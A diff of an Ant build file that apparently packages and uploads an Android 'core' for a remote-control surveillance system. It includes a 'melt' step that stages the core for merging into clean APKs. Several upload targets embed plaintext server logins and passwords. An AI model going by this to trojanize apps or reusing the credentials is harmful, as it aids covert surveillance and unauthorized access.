@@ -244,13 +244,7 @@
 		<sequential>
 			<echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>
 
-			<exec executable="dir" dir="." failonerror="true">
-			</exec>
-			<exec executable="dir" dir="." failonerror="true">
-				<arg value="${rcscore.path}/rcs-core.rb" />
-			</exec>
-			
-			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
+			<exec executable="${ruby.path}" dir="." failonerror="true">
 				<arg value="${rcscore.path}/rcs-core.rb" />
 				<arg value="-u" />
 				<arg value="@{login}" />
@@ -310,19 +304,6 @@
 		</checksum>
 	</target>
 
-	<target name="update">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\android_${version}.zip" />
-		<copy file=".\server\android_${version}.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" />
-	</target>
-
-	<target name="updatetest">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\android_${version}.zip" />
-	</target>
-
-	<target name="updatezenotto">
-		<updaterelease server="zenotto" login="admin" password="adminp123" file=".\server\android_${version}.zip" />
-		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
-	</target>
 
 	<target name="help">
 		<echo>ant build :  full build</echo>
@@ -416,7 +397,7 @@
 		<mkdir dir="output/merge/" />
 		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />		
 		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
-		<echo>..\..\merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
+		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
 	
 	<target name="servercore">
@@ -467,6 +448,24 @@
 
 	</target>
     
+	<target name="update">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+		<copy file="./server/android_${version}.zip" toFile="//rcs-dev/share/RELEASE/SVILUPPO/cores daVinci/android.zip" overwrite="true" />
+	</target>
+
+	<target name="updatecastore">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+	</target>
+	
+	<target name="updatepolluce">
+		<updaterelease server="rcs-polluce" login="zeno" password="zenop123" file="server/android_${version}.zip" />
+	</target>
+
+	<target name="updatezeus">
+		<updaterelease server="zeus" login="admin" password="adminp123" file="/server/android_${version}.zip" />
+		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
+	</target>
+    
     <target name="ci">        
         <echo>target ci</echo>
         <copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="false"/>
@@ -477,7 +476,7 @@
 
 		<antcall target="servercore" />
 		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
-		<antcall target="updatetest" />
+		<antcall target="updatecastore" />
     </target>
 
 </project>
